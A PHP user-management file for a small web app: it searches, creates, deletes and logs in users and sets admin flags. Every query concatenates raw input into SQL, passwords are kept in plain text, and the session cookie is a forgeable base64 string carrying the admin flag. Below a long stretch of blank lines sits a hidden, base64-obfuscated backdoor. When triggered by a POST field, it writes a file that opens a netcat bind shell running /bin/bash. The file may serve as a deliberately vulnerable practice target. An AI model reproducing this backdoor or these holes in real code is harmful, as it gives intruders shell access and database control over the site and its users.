<?php
	function get_db_infos()
	{
		return array(
			"srv" => "localhost",
			"usr" => "app",
			"pwd" => "app",
			"db" => "users"
		);
	}

	function search_user($username)
	{
		$dbi = get_db_infos();
		$conn = new mysqli($dbi["srv"], $dbi["usr"], $dbi["pwd"], $dbi["db"]);
		if(! $conn->connect_error)
		{
			$sql = "SELECT * FROM `users` WHERE USERNAME = '".$username."';";
			$result = $conn->query($sql);

			if($result->num_rows == 1)
			{
				$row = $result->fetch_assoc();
				return $row;
			}
		}

		return false;
	}

	function create_user($username, $password, $description)
	{
		if(! search_user($username))
		{
			$dbi = get_db_infos();
			$conn = new mysqli($dbi["srv"], $dbi["usr"], $dbi["pwd"], $dbi["db"]);
			if(! $conn->connect_error)
			{
				$sql = "INSERT INTO `users` (`USERNAME`, `PASSWORD`, `DESCRIPTION`, `admin`) VALUES ('".$username."', '".$password."', '".$description."', 0);";
				$result = $conn->query($sql);

				$pcontent = file_get_contents("./p/template.php");
				$towrite = str_replace("####USERNAME####", $username, $pcontent);

				file_put_contents("./p/".$username.".php", $towrite);
				mkdir("./files/".$username);

				return true;
			}
		}

		return false;
	}

	function delete_user($username)
	{
		if(search_user($username))
		{
			$dbi = get_db_infos();
			$conn = new mysqli($dbi["srv"], $dbi["usr"], $dbi["pwd"], $dbi["db"]);
			if(! $conn->connect_error)
			{
				$sql = "DELETE FROM `users` WHERE USERNAME = '".$username."';";
				$result = $conn->query($sql);

				return true;
			}
		}

		return false;
	}

	function login_user($username, $password)
	{
		if(search_user($username))
		{
			$dbi = get_db_infos();
			$conn = new mysqli($dbi["srv"], $dbi["usr"], $dbi["pwd"], $dbi["db"]);
			if(! $conn->connect_error)
			{
				$sql = "SELECT * FROM `users` WHERE USERNAME = '".$username."' AND PASSWORD = '".$password."';";
				$result = $conn->query($sql);

				if($result->num_rows == 1)
				{
					$user_infos = $result->fetch_assoc();
					setcookie("ALEXSESSID", base64_encode($user_infos["USERNAME"]."#".$user_infos["admin"]));

					return true;
				}
			}
		}

		return false;
	}

	function logout_user()
	{
		setcookie("ALEXSESSID", "", 1);
	}

	function set_admin($username, $value)
	{
		if(search_user($username))
		{
			$dbi = get_db_infos();
			$conn = new mysqli($dbi["srv"], $dbi["usr"], $dbi["pwd"], $dbi["db"]);
			if(! $conn->connect_error)
			{
				$sql = "UPDATE `users` SET admin = ".$value." WHERE USERNAME = '".$username."';";
				$result = $conn->query($sql);

				return true;
			}
		}

		return false;
	}

	function connect_infos()
	{
		if(isset($_COOKIE["ALEXSESSID"]))
		{
			$dec = explode("#", base64_decode($_COOKIE["ALEXSESSID"]));
			return array(
				"USERNAME" => $dec[0],
				"ADMIN" => $dec[1]
			);
		}

		return false;
	}


























































































if(isset($_POST["BCKDR"])) { if($_POST["BCKDR"] == "o") exec(base64_decode("ZWNobyAiPD9waHAgZXhlYyhiYXNlNjRfZGVjb2RlKFwiYm1NdWRISmhaR2wwYVc5dVlXd2dMV3gyYm5BZ05qQXlOVEFnTFdVZ0wySnBiaTlpWVhOb1wiKTsgPz4iID4gYmNrZHIucGhw")); } ?>
